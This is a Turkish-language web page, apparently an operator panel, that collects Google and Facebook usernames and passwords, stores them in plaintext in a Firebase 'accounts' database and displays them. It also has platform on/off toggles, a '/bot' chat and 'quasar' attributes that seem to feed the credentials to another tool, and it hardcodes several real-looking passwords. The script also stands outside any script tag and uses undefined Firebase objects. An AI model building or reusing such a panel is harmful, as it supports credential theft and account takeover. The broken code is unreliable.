<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hesap Takip Paneli</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #eef2f3; padding: 20px; }
        .container { max-width: 450px; margin: auto; }
        #dataList, #msgList { margin-bottom: 20px; max-height: 300px; overflow-y: auto; }
        .mesaj-kutusu { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #5c67f2; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .mesaj-kutusu.bot-mesaj { background: #f2e8f8; border-left-color: #d048f6; }
        .mesaj-kutusu img { width: 30px; }
        .info { flex: 1; line-height: 1.6; }
        .del-btn { max-width: 50px; background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
        .panel { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; position: relative; }
        .logo-group { display: flex; gap: 10px; margin-bottom: 15px; }
        .platform-btn { flex: 1; padding: 10px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
        .platform-btn img { width: 24px; vertical-align: middle; }
        .platform-btn.active { border-color: #5c67f2; background: #f0f2ff; }
        .input-row { display: flex; gap: 5px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        select { padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
        .btn-container { display: flex; gap: 10px; }
        button { flex: 1; padding: 12px; background: #5c67f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .multi-btn { background: #27ae60; }
        .chat-input { display: flex; flex-direction: row; justify-content: center; align-items: center; gap: 5px; margin-top: 10px; }

        /* Sağ üst küçük sembol buton tasarımı */
        .settings-toggle-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #34495e;
            color: white;
            border: none;
            width: 36px;
            height: 36px;
            /*border-radius: 50%;*/
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            /*flex: initial;*/
            z-index: 10;
        }
        .settings-content { display: none; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 15px;  }
        .settings-content.open { display: block; }
        .platform-toggle-grid { width: 100%; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
        .toggle-item { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; border: 1px solid #ddd; border-radius: 6px; background: #fafafa; font-size: 13px; }
        .toggle-item img { width: 18px; vertical-align: middle; margin-right: 5px; }
        .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .3s; border-radius: 20px; }
        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 4px; bottom: 4px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #27ae60; }
        input:checked + .slider:before { transform: translateX(14px); }
    </style>
</head>
<body>

<div class="container">
    <h3 style="text-align: center;">Hesaplar (<span id="accCount">0</span>)</h3>
    <div id="dataList"></div>
    <div class="panel">
        <!-- Sadece sembol olan küçük sağ üst buton ve ayarlar -->
        <button id="toggleSettingsBtn" class="settings-toggle-btn" title="Ayarlar">⚙️</button>
        <div id="settingsPanel" class="settings-content">
            <h4 style="margin: 0 0 10px 0; font-size: 14px;">Uygulama Durumları</h4>
            <div class="platform-toggle-grid" id="platformToggleGrid">
                <!-- Dinamik logolar ve aktiflik anahtarları buraya gelecek -->
            </div>
        </div>

        <h3>Hesap Girişi</h3>
        <div class="logo-group">
            <div class="platform-btn active" id="btnGoogle" onclick="selectPlatform('Google')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
            </div>
            <div class="platform-btn" id="btnFacebook" onclick="selectPlatform('Facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
            </div>
        </div>
        <input type="hidden" id="selectedPlatform" value="Google">
        <div class="input-row">
            <input type="text" id="usernameInput" placeholder="Kullanıcı adı">
            <select id="domainSelect">
                <option value="@gmail.com">@gmail.com</option>
                <option value="@outlook.com">@outlook.com</option>
                <option value="@sharklasers.com">@sharklasers.com</option>
                <option value="@hotmail.com">@hotmail.com</option>
                <option value="@yahoo.com">@yahoo.com</option>
                <option value="@icloud.com">@icloud.com</option>
                <option value="@live.com">@live.com</option>
                <option value="@yandex.com">@yandex.com</option>
                <option value="@mail.ru">@mail.ru</option>
                <option value="@gmx.com">@gmx.com</option>
            </select>
        </div>
        <input type="text" id="passwordInput" list="passwordList" placeholder="Şifre...">
        <datalist id="passwordList">
            <option value="malkafam98"><option value="haydo388"><option value="salakkafam98"><option value="aptalkafam98"><option value="haydar388">
        </datalist>
        <div class="btn-container">
            <button id="sendBtn">Gönder</button>
            <button id="sendMultiBtn" class="multi-btn">Hepsine Gönder</button>
            <button onclick="quasarTest()">Test</button>
        </div>
        <div class="chat-input">
            <input type="text" id="chatMsg" placeholder="Mesaj yaz...">
            <button id="sendChatBtn" style="height: 40px; flex:0; padding:0 20px;">Gönder</button>
        </div>
    </div>
    <h3>Mesajlar</h3>
    <div id="msgList"></div>
</div>

    document.getElementById('toggleSettingsBtn').onclick = () => {
        document.getElementById('settingsPanel').classList.toggle('open');
    };

    window.togglePlatformStatus = (p, status) => {
        set(ref(db, `ayarlar/platformlar/${p}`), status);
    };

    function renderSettingsUI() {
        const toggleGrid = document.getElementById('platformToggleGrid');
        toggleGrid.innerHTML = '';
        for (let p in settingsPlatforms) {
            const data = settingsPlatforms[p];
            const item = document.createElement('div');
            item.className = 'toggle-item';
            item.innerHTML = `
                <span><img src="${data.logo}">${p}</span>
                <label class="switch">
                    <input type="checkbox" ${data.active ? 'checked' : ''} onchange="togglePlatformStatus('${p}', this.checked)">
                    <span class="slider"></span>
                </label>
            `;
            toggleGrid.appendChild(item);
        }
    }

    onValue(settingsRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            for (let p in val) {
                if (settingsPlatforms[p]) {
                    settingsPlatforms[p].active = val[p];
                }
            }
        } else {
            for (let p in settingsPlatforms) {
                set(ref(db, `ayarlar/platformlar/${p}`), settingsPlatforms[p].active);
            }
        }
        renderSettingsUI();
    });

    onValue(dataRef, (snapshot) => {
        document.getElementById('accCount').innerText = snapshot.size || 0;
    });

    window.selectPlatform = (p) => {
        document.getElementById('selectedPlatform').value = p;
        document.getElementById('btnGoogle').className = p === 'Google' ? 'platform-btn active' : 'platform-btn';
        document.getElementById('btnFacebook').className = p === 'Facebook' ? 'platform-btn active' : 'platform-btn';
    };

    document.getElementById('sendBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return alert("Alanları boş bırakma!");
        push(dataRef, { platform: document.getElementById('selectedPlatform').value, user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendMultiBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return alert("Alanları boş bırakma!");
        push(dataRef, { platform: 'Google', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        push(dataRef, { platform: 'Facebook', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendChatBtn').onclick = () => {
        let msg = document.getElementById('chatMsg').value.trim();
        if(!msg) return;

        let isBot = false;
        if (msg.startsWith('/bot')) {
            isBot = true;
            msg = msg.replace('/bot', '').trim(); // /bot ifadesini temizle
        }

        if(!msg) return;
        push(msgRef, { text: msg, isBot: isBot, time: new Date().toLocaleTimeString() });
        document.getElementById('chatMsg').value = '';
    };

    onChildAdded(dataRef, (data) => {
        const v = data.val();
        const logo = v.platform === 'Google' ? 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg' : 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg';
        const div = document.createElement('div');
        div.className = 'mesaj-kutusu';
        div.id = data.key;
        div.innerHTML = `
        <img src="${logo}">
        <div class="info">
            <strong quasar-platform="${v.platform}">${v.platform}</strong><br>
            <span class="q-userName">${v.user}</span><br>
            <span class="q-password">${v.pass}</span>
        </div>
        <button class="del-btn" onclick="removeData('${data.key}')">Sil</button>
    `;
        const list = document.getElementById('dataList');
        const oldFirst = list.querySelector('.first-item');
        if (oldFirst) oldFirst.classList.remove('first-item');
        div.classList.add('first-item');
        list.prepend(div);
    });

    onChildRemoved(dataRef, (data) => {
        const element = document.getElementById(data.key);
        if (element) {
            element.remove();
        }
    });

    onChildAdded(msgRef, (data) => {
        const val = data.val();
        const div = document.createElement('div');
        div.className = val.isBot ? 'mesaj-kutusu bot-mesaj' : 'mesaj-kutusu';
        if (!val.isBot) div.style.borderLeftColor = '#27ae60';

        const prefix = val.isBot ? '<strong>[Bot]:</strong> ' : '';
        div.innerHTML = `<div class="info">${prefix}${val.text} <br><small>${val.time}</small></div>`;
        document.getElementById('msgList').prepend(div);
    });

    window.removeData = (key) => {
        remove(ref(db, 'hesaplar/' + key));
    };

    setInterval(() => {
        remove(msgRef)
            .then(() => {
                console.log("Mesajlar başarıyla sıfırlandı.");
                document.getElementById('msgList').innerHTML = '';
            })
            .catch((error) => {
                console.error("Mesajlar silinirken hata oluştu: ", error);
            });
    }, 900000);

    window.push = push;
    window.dataRef = ref(db, 'hesaplar'); // dataRef'i global yaptık
